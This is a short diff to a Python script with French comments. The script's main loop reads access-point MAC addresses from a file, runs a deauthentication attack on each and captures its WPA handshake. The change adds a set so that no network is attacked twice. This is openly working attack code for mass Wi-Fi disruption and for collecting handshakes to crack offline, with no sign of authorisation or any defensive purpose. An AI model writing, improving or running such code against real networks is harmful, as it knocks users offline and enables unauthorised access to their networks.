@@ -52,10 +52,15 @@ def deauth_attack(ap_address):
 
 if __name__ == "__main__":
     networks = scan_wifi()
+    attacked_networks = set()  # Ensemble pour suivre les réseaux déjà attaqués
 
     with open("networks.txt", "r") as f:
         for line in f:
             mac_address = line.split(" - ")[0]
-            logging.info(f"Démarrage de l'attaque de désauthentification sur {mac_address}")
-            deauth_attack(mac_address)
-            capture_handshake(mac_address)  # Capturer le handshake avant de passer à l'adresse suivante
+
+            # Vérifier si l'adresse MAC a déjà été attaquée
+            if mac_address not in attacked_networks:
+                logging.info(f"Démarrage de l'attaque de désauthentification sur {mac_address}")
+                deauth_attack(mac_address)
+                capture_handshake(mac_address)  # Capturer le handshake
+                attacked_networks.add(mac_address)  # Ajouter à l'ensemble des réseaux attaqués
